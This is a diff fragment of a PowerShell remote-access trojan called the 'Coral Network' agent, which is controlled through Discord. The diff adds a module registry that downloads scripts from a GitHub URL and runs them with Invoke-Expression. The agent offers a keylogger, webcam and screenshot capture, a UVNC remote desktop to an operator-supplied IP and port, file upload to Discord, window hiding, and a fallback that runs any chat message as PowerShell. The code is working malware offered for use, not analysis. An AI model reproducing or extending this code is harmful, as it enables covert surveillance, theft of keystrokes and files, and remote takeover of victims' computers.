+        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/nekos/"
+        scripts = @{
+            ENABLENEKOGRABBER = @{
+                url = "Mnekograbber.ps1"
+                function = "Mgetneko"
+                alias = "ENABLENEKOGRABBER"
+                description = "Download neko executable"
+                params = @()
+            }
+            DISABLENEKOGRABBER = @{
+                url = "Mnekograbber.ps1"
+                function = "Mremoveneko"
+                alias = "DISABLENEKOGRABBER"
+                description = "Remove neko executable"
+                params = @()
+            }
+            ENABLENEKOUVNC =@{
+                url = "MnekoUVNC.ps1"
+                function = "MStartUvnc"
+                alias = "ENABLENEKOUVNC"
+                description = "Start UVNC server"
+                params = @("ip", "port")
+            }
+            DISABLENEKOUVNC =@{
+                url = "MnekoUVNC.ps1"
+                function = "MRemoveUVNC"
+                alias = "DISABLENEKOUVNC"
+                description = "Remove UVNC server"
+                params = @()
+            }
+        }
+        loaded = $false
+        required = $false
+    }
+}
+function Is_LocalFunction {
+    param([string]$FunctionName)
+    
+    # Check if function exists locally
+    return (Get-Command $FunctionName -ErrorAction SilentlyContinue) -ne $null
+}
+
+function List_Modules {
+    $msg = ":package: **Available Modules:**`n`n"
+    
+    foreach ($moduleName in $global:ModuleRegistry.Keys) {
+        $module = $global:ModuleRegistry[$moduleName]
+        $status = if ($module.loaded) { ":green_circle: Loaded" } else { ":red_circle: Not Loaded" }
+        $required = if ($module.required) { " (Required)" } else { "" }
+        
+        $msg += "**$($module.name)** ``$moduleName``$required - $status`n"
+        
+        if ($module.ContainsKey("scripts")) {
+            foreach ($scriptName in $module.scripts.Keys) {
+                $script = $module.scripts[$scriptName]
+                $params = if ($script.params.Count -gt 0) { " [" + ($script.params -join ", ") + "]" } else { "" }
+                $msg += "  • **$($script.alias)**$params - $($script.description)`n"
+            }
+        } elseif ($module.ContainsKey("functions")) {
+            foreach ($func in $module.functions) {
+                $msg += "  • **$func**`n"
+            }
+        }
+        $msg += "`n"
+    }
+    
+    sendEmbedWithImage -Title "Available Modules" -Description $msg 
+}
+
+function Get_AvailableCommands {
+    $commands = @()
+    
+    foreach ($moduleName in $global:ModuleRegistry.Keys) {
+        $module = $global:ModuleRegistry[$moduleName]
+        
+        if ($module.ContainsKey("scripts")) {
+            foreach ($scriptName in $module.scripts.Keys) {
+                $script = $module.scripts[$scriptName]
+                $status = if ($module.loaded) { ":green_circle:" } else { ":red_circle:" }
+                $params = if ($script.params.Count -gt 0) { " [" + ($script.params -join " ") + "]" } else { "" }
+                $commands += "**$($script.alias.ToUpper())**$params $status - $($script.description) *(Module: $moduleName)*"
+            }
+        } elseif ($module.ContainsKey("functions")) {
+            foreach ($func in $module.functions) {
+                $status = if ($module.loaded) { ":green_circle:" } else { ":red_circle:" }
+                $commands += "**$($func.ToUpper())** $status *(Module: $moduleName)*"
+            }
+        }
+    }
+    
+    if ($commands.Count -eq 0) {
+        sendMsg -Message ":information_source: **No commands available in registry**"
+        return
+    }
+    
+    $msg = ":gear: **Available Commands:**`n`n" + ($commands -join "`n")
+    sendMsg -Message $msg
+}
+
+function Execute_Command {
+    param([string]$Command)
+    
+    $commandLower = $Command.ToLower()
+    
+    # Check if it's a local function first
+    if (Is_LocalFunction -FunctionName $commandLower) {
+        try {
+            & $commandLower
+            return $true
+        } catch {
+            sendMsg -Message ":x: **Error executing local function:** ``$commandLower`` - $($_.Exception.Message)"
+            return $false
+        }
+    }
+    
+    # Check if it's a remote function in the registry
+    foreach ($moduleName in $global:ModuleRegistry.Keys) {
+        $module = $global:ModuleRegistry[$moduleName]
+        
+        if ($module.ContainsKey("scripts")) {
+            foreach ($scriptName in $module.scripts.Keys) {
+                $script = $module.scripts[$scriptName]
+                
+                if ($script.alias.ToLower() -eq $commandLower) {
+                    try {
+                        sendMsg -Message ":gear: **Loading remote function:** ``$($script.alias)`` **from module:** ``$moduleName``"
+                        
+                        # Download and execute the remote script
+                        $fullUrl = $module.baseUrl + $script.url
+                        $scriptContent = Invoke-RestMethod $fullUrl
+                        Invoke-Expression $scriptContent
+                        
+                        # Mark module as loaded
+                        $global:ModuleRegistry[$moduleName].loaded = $true
+                        
+                        # Execute the function
+                        & $script.function
+                        return $true
+                        
+                    } catch {
+                        sendMsg -Message ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
+                        return $false
+                    }
+                }
+            }
+        }
+    }
+    
+    return $false
+}
+
+function Find_CommandInRegistry {
+    param([string]$Command)
+    
+    $commandUpper = $Command.ToUpper()
+    $commandLower = $Command.ToLower()
+    
+    # Search through all modules for the command
+    foreach ($moduleName in $global:ModuleRegistry.Keys) {
+        $module = $global:ModuleRegistry[$moduleName]
+        
+        if ($module.ContainsKey("scripts")) {
+            foreach ($scriptName in $module.scripts.Keys) {
+                $script = $module.scripts[$scriptName]
+                
+                # Check if command matches the script key (exact uppercase match)
+                if ($scriptName -eq $commandUpper) {
+                    return @{
+                        Found = $true
+                        ModuleName = $moduleName
+                        Script = $script
+                        ScriptName = $scriptName
+                        IsRemote = $true
+                    }
+                }
+                
+                # Check if command matches the alias (case insensitive)
+                if ($script.alias.ToLower() -eq $commandLower) {
+                    return @{
+                        Found = $true
+                        ModuleName = $moduleName
+                        Script = $script
+                        ScriptName = $scriptName
+                        IsRemote = $true
+                    }
+                }
+            }
+        }
+        
+        # Check local functions in module
+        if ($module.ContainsKey("functions")) {
+            foreach ($funcName in $module.functions) {
+                if ($funcName.ToLower() -eq $commandLower) {
+                    return @{
+                        Found = $true
+                        ModuleName = $moduleName
+                        FunctionName = $funcName
+                        IsRemote = $false
+                    }
+                }
+            }
+        }
+    }
+    
+    return @{ Found = $false }
+}
+
+function Execute_DynamicCommand {
+    param([string]$Command)
+    
+    # First check if it's already a local function
+    if (Get-Command $Command -ErrorAction SilentlyContinue) {
+        try {
+            & $Command
+            return $true
+        } catch {
+            sendMsg -Message ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
+            return $false
+        }
+    }
+    
+    # Search in module registry
+    $commandInfo = Find_CommandInRegistry -Command $Command
+    
+    if (-not $commandInfo.Found) {
+        return $false
+    }
+    
+    if ($commandInfo.IsRemote) {
+        # Handle remote function
+        $module = $global:ModuleRegistry[$commandInfo.ModuleName]
+        $script = $commandInfo.Script
+        
+        try {
+            sendMsg -Message ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
+            
+            # Download and execute the remote script
+            $fullUrl = $module.baseUrl + $script.url
+            $scriptContent = Invoke-RestMethod $fullUrl
+            Invoke-Expression $scriptContent
+            
+            # Mark module as loaded
+            $global:ModuleRegistry[$commandInfo.ModuleName].loaded = $true
+            
+            # Execute the function
+            & $script.function
+            return $true
+            
+        } catch {
+            sendMsg -Message ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
+            return $false
+        }
+    } else {
+        # Handle local function from registry
+        try {
+            & $commandInfo.FunctionName
+            return $true
+        } catch {
+            sendMsg -Message ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
+            return $false
+        }
+    }
+}
+
+function Parse_CommandWithParameters {
+    param([string]$FullCommand)
+    
+    # Handle simple command (no parameters)
+    if ($FullCommand -notmatch '\s') {
+        return @{
+            Command = $FullCommand
+            Parameters = @{}
+        }
+    }
+    
+    # Split command and parameters
+    $parts = $FullCommand -split '\s+', 2
+    $command = $parts[0]
+    $paramString = if ($parts.Length -gt 1) { $parts[1] } else { "" }
+    
+    # Parse parameters - support both positional and named parameters
+    $parameters = @{}
+    if ($paramString) {
+        # Check if using named parameters (-param value format)
+        if ($paramString -match '-\w+') {
+            # Named parameter parsing
+            $regex = '-(\w+)\s+([^\-]+?)(?=\s+-\w+|$)'
+            $matches = [regex]::Matches($paramString, $regex)
+            foreach ($match in $matches) {
+                $paramName = $match.Groups[1].Value.Trim()
+                $paramValue = $match.Groups[2].Value.Trim()
+                $parameters[$paramName] = $paramValue
+            }
+        } else {
+            # Positional parameter parsing - split by spaces, handle quotes
+            $paramList = @()
+            if ($paramString -match '".*"' -or $paramString -match "'.*'") {
+                # Advanced parsing for quoted strings
+                $regex = '(?:"([^"]*)"|''([^'']*)''|(\S+))'
+                $matches = [regex]::Matches($paramString, $regex)
+                foreach ($match in $matches) {
+                    if ($match.Groups[1].Success) {
+                        $paramList += $match.Groups[1].Value
+                    } elseif ($match.Groups[2].Success) {
+                        $paramList += $match.Groups[2].Value
+                    } else {
+                        $paramList += $match.Groups[3].Value
+                    }
+                }
+            } else {
+                # Simple space-separated
+                $paramList = $paramString -split '\s+'
+            }
+            
+            # Convert positional to hashtable based on function definition
+            $commandInfo = Find_CommandInRegistry -Command $command
+            if ($commandInfo.Found -and $commandInfo.IsRemote -and $commandInfo.Script.params) {
+                for ($i = 0; $i -lt [Math]::Min($paramList.Count, $commandInfo.Script.params.Count); $i++) {
+                    $parameters[$commandInfo.Script.params[$i]] = $paramList[$i]
+                }
+            } else {
+                # If no parameter definition found, use generic names
+                for ($i = 0; $i -lt $paramList.Count; $i++) {
+                    $parameters["param$i"] = $paramList[$i]
+                }
+            }
+        }
+    }
+    
+    return @{
+        Command = $command
+        Parameters = $parameters
+    }
+}
+
+function Execute_DynamicCommandWithParams {
+    param([string]$Command, [hashtable]$Parameters = @{})
+    
+    # First check if it's already a local function
+    if (Get-Command $Command -ErrorAction SilentlyContinue) {
+        try {
+            if ($Parameters.Count -gt 0) {
+                & $Command @Parameters
+            } else {
+                & $Command
+            }
+            return $true
+        } catch {
+            sendMsg -Message ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
+            return $false
+        }
+    }
+    
+    # Search in module registry
+    $commandInfo = Find_CommandInRegistry -Command $Command
+    
+    if (-not $commandInfo.Found) {
+        return $false
+    }
+    
+    if ($commandInfo.IsRemote) {
+        # Handle remote function
+        $module = $global:ModuleRegistry[$commandInfo.ModuleName]
+        $script = $commandInfo.Script
+        
+        try {
+            sendMsg -Message ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
+            
+            # Download and execute the remote script
+            $fullUrl = $module.baseUrl + $script.url
+            $scriptContent = Invoke-RestMethod $fullUrl
+            Invoke-Expression $scriptContent
+            
+            # Mark module as loaded
+            $global:ModuleRegistry[$commandInfo.ModuleName].loaded = $true
+            
+            # Execute the function with parameters
+            if ($Parameters.Count -gt 0) {
+                # Special handling for specific functions that need global variables
+                if ($script.function -eq "Mcreate_Ptask" -and -not $Parameters.ContainsKey("token")) {
+                    $Parameters["token"] = $global:token
+                }
+                
+                & $script.function @Parameters
+                
+                # Display parameter info
+                $paramInfo = ($Parameters.GetEnumerator() | ForEach-Object { "$($_.Key): $($_.Value)" }) -join ", "
+                sendMsg -Message ":gear: **Executed with parameters:** ``$paramInfo``"
+            } else {
+                & $script.function
+            }
+            return $true
+            
+        } catch {
+            sendMsg -Message ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
+            return $false
+        }
+    } else {
+        # Handle local function from registry
+        try {
+            if ($Parameters.Count -gt 0) {
+                & $commandInfo.FunctionName @Parameters
+            } else {
+                & $commandInfo.FunctionName
+            }
+            return $true
+        } catch {
+            sendMsg -Message ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
+            return $false
+        }
+    }
+}
+
+function Get_FunctionHelp {
+    param([string]$FunctionName)
+    
+    $commandInfo = Find_CommandInRegistry -Command $FunctionName
+    
+    if (-not $commandInfo.Found) {
+        sendMsg -Message ":x: **Function not found:** ``$FunctionName``"
+        return
+    }
+    
+    if ($commandInfo.IsRemote) {
+        $script = $commandInfo.Script
+        $msg = ":information_source: **Function Help: $($script.alias.ToUpper())**`n"
+        $msg += "**Description:** $($script.description)`n"
+        $msg += "**Module:** $($commandInfo.ModuleName)`n"
+        
+        if ($script.params.Count -gt 0) {
+            $msg += "**Parameters:** " + ($script.params -join ", ") + "`n"
+            $msg += "`n**Usage Examples:**`n"
+            $msg += "• ``$($script.alias.ToUpper()) " + ($script.params -join " <value> ") + " <value>`` (positional)`n"
+            $msg += "• ``$($script.alias.ToUpper()) " + ($script.params | ForEach-Object { "-$_ <value>" }) -join " " + "`` (named)"
+        } else {
+            $msg += "**Parameters:** None`n"
+            $msg += "**Usage:** ``$($script.alias.ToUpper())``"
+        }
+        
+        sendMsg -Message $msg
+    } else {
+        sendMsg -Message ":information_source: **Local function:** ``$($commandInfo.FunctionName)`` - No parameter info available"
+    }
+}
+# =============================== HELP MENU ( R )===============================
 function display_help {
     $message = "
-:robot: **Coral Agent Help Menu:**
+:robot: **Coral Agent Help Menu - Dynamic Module System:**
 
 **Basic Commands:**
 - **TEST:** Test the connection to the Coral Network
 - **HELP:** Display this help menu
+- **HELP <function>:** Get detailed help for a specific function
 - **EXIT:** Disconnect from the Coral Network
+
+**Module Management:**
+- **MODULES:** List all available modules and their status
+- **COMMANDS:** List all available functions from loaded modules
 
 **Job Management:**
 - **JOBS:** List all active jobs with their status
@@ -944,28 +1649,39 @@ function display_help {
 - **JOBSTATUS <jobname>:** Get detailed status of a job
 - **STOPALLJOBS:** Stop all running jobs
 
+**Theme System:**
+- **GETTHEME:** Show current theme status and details
+- **SETTHEME <name>:** Set theme (darktheme, neko_maid, neko_kimono, neko_cafe)
+- **ENABLETHEME:** Enable theme functionality
+- **DISABLETHEME:** Disable theme functionality
+
 **Keylogger Commands:**
 - **STARTKEYLOG:** Start keylogger with default 30-second intervals
 - **STARTKEYLOG <seconds>:** Start keylogger with custom interval (1-300 seconds)
 - **STOPKEYLOG:** Stop the keylogger
 - **KEYLOGSTATUS:** Check keylogger status
 
-**Webcam Commands:**
-- **WEBCAM:** Record 1 second of webcam video
-
-**Screenshot Commands:**
-- **SCREENSHOTALL:** Take screenshots of all monitors
-
 **File Operations:**
 - **SENDFILE <filepath>:** Upload a file to Discord
-- **DOWNLOADFILE [path]:** Download file attachments from Discord (optional custom path)
+- **DOWNLOADFILE [path]:** Download file attachments from Discord
 
-**UVNC Commands:**
-- **STARTUVNC <ip> <port>:** Start the UVNC client
+**Parameter Usage Examples:**
+**Positional:** ``SETTHEME neko_maid`` ``STARTKEYLOG 60``
+**Named:** ``SETTHEME -name neko_maid`` ``CREATEJOB -command SCREENSHOT``
+
+**Job Examples:**
+- ``CREATEJOB SCREENSHOT``
+- ``CREATEJOB WEBCAM 10 high``
+- ``CREATEJOB Get-Process``
+
+:information_source: **Use** ``MODULES`` **to see all available modules**
+:gear: **Use** ``COMMANDS`` **to see all dynamic functions with parameters**
+:question: **Use** ``HELP <function>`` **for detailed function help**
+
+**Note:** Dynamic functions (SCREENSHOT, WEBCAM, AUDIO, etc.) are loaded automatically when called!
 "
-    sendMsg -Message $message
+    sendEmbedWithImage -Title "Coral Agent Help Menu" -Description $message
 }
-
 # =============================== INITIALIZATION ===============================
 try {
     $mutexName = "Global\CoralNetworkAgent_$env:COMPUTERNAME"
@@ -986,7 +1702,7 @@ try {
 } catch { exit 1 }
 
 if ($global:hidewindow) { try { HideWindow } catch {} }
-try { sendMsg -Message "``$env:COMPUTERNAME connected to Coral Network``" } catch { exit 1 }
+try { sendEmbedWithImage -Title "Connected to Coral Network" -Description "You are now connected to the Coral Network." } catch { exit 1 }
 
 # =============================== MAIN LOOP ===============================
 while ($true) {
@@ -995,56 +1711,85 @@ while ($true) {
     if ($latestMessage -and $latestMessage -ne $previousMessage) {
         $previousMessage = $latestMessage
         
-        switch ($latestMessage) {
+        # Parse command and parameters
+        $parsed = Parse_CommandWithParameters -FullCommand $latestMessage
+        $command = $parsed.Command.ToUpper()
+        $parameters = $parsed.Parameters
+        
+        switch ($command) {
             'TEST' { sendMsg -Message "Test successful from $env:COMPUTERNAME" }
-            'HELP' { display_help }
-            'STARTKEYLOG' { Start_Keylogger }
+            'HELP' { 
+                if ($parameters.Count -gt 0 -and $parameters.ContainsKey("param0")) {
+                    Get_FunctionHelp -FunctionName $parameters["param0"]
+                } else {
+                    display_help 
+                }
+            }
+            'MODULES' { List_Modules }
+            'COMMANDS' { Get_AvailableCommands }
+            'GETTHEME' { GetCurrentTheme }
+            'ENABLETHEME' { EnableTheme }
+            'DISABLETHEME' { DisableTheme }
+            'STARTKEYLOG' { 
+                if ($parameters.ContainsKey("param0") -and $parameters["param0"] -match '^\d+$') {
+                    $interval = [int]$parameters["param0"]
+                    if ($interval -ge 1 -and $interval -le 300) {
+                        Start_Keylogger -intervalSeconds $interval
+                    } else {
+                        sendMsg -Message ":x: **Invalid interval. Use 1-300 seconds**"
+                    }
+                } else {
+                    Start_Keylogger
+                }
+            }
             'STOPKEYLOG' { Stop_Keylogger }
             'KEYLOGSTATUS' { Get_KeyloggerStatus }
-            'WEBCAM' { Webcam }
-            'SCREENSHOTALL' { screenshot_all }
             'JOBS' { List_AgentJobs }
             'STOPALLJOBS' { Stop_AllAgentJobs }
             'EXIT' { 
                 sendMsg -Message "**$env:COMPUTERNAME disconnecting from Coral Network**"
                 Stop_AllAgentJobs
-                RemoveUVNC
+                RemoveFfmpeg
+                Execute_DynamicCommandWithParams -Command "DISABLENEKOUVNC"
                 Cleanup_CoralAgent
                 exit 
             }
+            
             default {
-                if ($latestMessage -match "^CREATEJOB (.+)$") {
-                    $scriptBlock = $matches[1]
+                if ($command -eq "SETTHEME" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
+                    $themeName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                    SetCurrentTheme -themename $themeName
+                }
+                elseif ($command -eq "CREATEJOB" -and ($parameters.ContainsKey("param0") -or $parameters.Count -gt 0)) {
+                    $scriptBlock = if ($parameters.ContainsKey("param0")) { $parameters["param0"] } else { 
+                        ($parameters.Values -join " ") 
+                    }
                     Start_AgentJob -ScriptString $scriptBlock
                 }
-                elseif ($latestMessage -match "^DELETEJOB (.+)$") {
-                    $jobName = $matches[1]
+                elseif ($command -eq "DELETEJOB" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
+                    $jobName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                     Remove_AgentJob -JobName $jobName
                 }
-                elseif ($latestMessage -match "^JOBOUTPUT (.+)$") {
-                    $jobName = $matches[1]
+                elseif ($command -eq "JOBOUTPUT" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
+                    $jobName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                     Get_AgentJobOutput -JobName $jobName
                 }
-                elseif ($latestMessage -match "^JOBSTATUS (.+)$") {
-                    $jobName = $matches[1]
+                elseif ($command -eq "JOBSTATUS" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
+                    $jobName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                     Get_AgentJobStatus -JobName $jobName
                 }
-                elseif ($latestMessage -match "^SENDFILE (.+)$") {
-                    $filePath = $matches[1].Trim()
+                elseif ($command -eq "SENDFILE" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("path"))) {
+                    $filePath = if ($parameters.ContainsKey("path")) { $parameters["path"] } else { $parameters["param0"] }
                     if (Test-Path $filePath) {
                         sendFile -sendfilePath $filePath
                     } else {
                         sendMsg -Message ":x: **File not found:** ``$filePath``"
                     }
                 }
-                elseif ($latestMessage -match "^UVNC (.+) (.+)$") {
-                    $ip = $matches[1].Trim()
-                    $port = $matches[2].Trim()
-                    StartUvnc -ip $ip -port $port
-                }
-                elseif ($latestMessage -match "^DOWNLOADFILE(.*)$") {
-                    $downloadPath = $matches[1].Trim()
-                    if (-not $downloadPath) { $downloadPath = $env:TEMP }
+                elseif ($command -eq "DOWNLOADFILE") {
+                    $downloadPath = if ($parameters.ContainsKey("path")) { $parameters["path"] } 
+                                   elseif ($parameters.ContainsKey("param0")) { $parameters["param0"] } 
+                                   else { $env:TEMP }
                     
                     if ($global:lastMessageAttachments -and $global:lastMessageAttachments.Count -gt 0) {
                         sendMsg -Message ":inbox_tray: **Starting download of $($global:lastMessageAttachments.Count) file(s)...**"
@@ -1062,29 +1807,27 @@ while ($true) {
                         sendMsg -Message ":information_source: **Usage:** Send a message with file attachments and the command ``DOWNLOADFILE [path]``"
                     }
                 }
-                elseif ($latestMessage -match "^STARTKEYLOG (\d+)$") {
-                    $interval = [int]$matches[1]
-                    if ($interval -ge 1 -and $interval -le 300) {
-                        Start_Keylogger -intervalSeconds $interval
-                    } else {
-                        sendMsg -Message ":x: **Invalid interval. Use 1-300 seconds**"
-                    }
-                }
                 else {
-                    try {
-                        $result = Invoke-Expression $latestMessage 2>&1
-                        if ($result) {
-                            $output = $result | Out-String
-                            sendMsg -Message "``````$output``````"
-                        } else {
-                            sendMsg -Message "**Command executed successfully (no output)**"
+                    # Try to execute as a dynamic command from the registry with parameters
+                    $commandExecuted = Execute_DynamicCommandWithParams -Command $command -Parameters $parameters
+                    
+                    if (-not $commandExecuted) {
+                        # Fall back to PowerShell expression evaluation
+                        try {
+                            $result = Invoke-Expression $latestMessage 2>&1
+                            if ($result) {
+                                $output = $result | Out-String
+                                sendMsg -Message "``````$output``````"
+                            } else {
+                                sendMsg -Message "**Command executed successfully (no output)**"
+                            }
+                        } catch {
+                            $errorMsg = $_.Exception.Message
+                            if ($errorMsg.Length -gt 1000) {
+                                $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
+                            }
+                            sendMsg -Message ":x: ``Error: $errorMsg`` :x:"
                         }
-                    } catch {
-                        $errorMsg = $_.Exception.Message
-                        if ($errorMsg.Length -gt 1000) {
-                            $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
-                        }
-                        sendMsg -Message ":x: ``Error: $errorMsg`` :x:"
                     }
                 }
             }
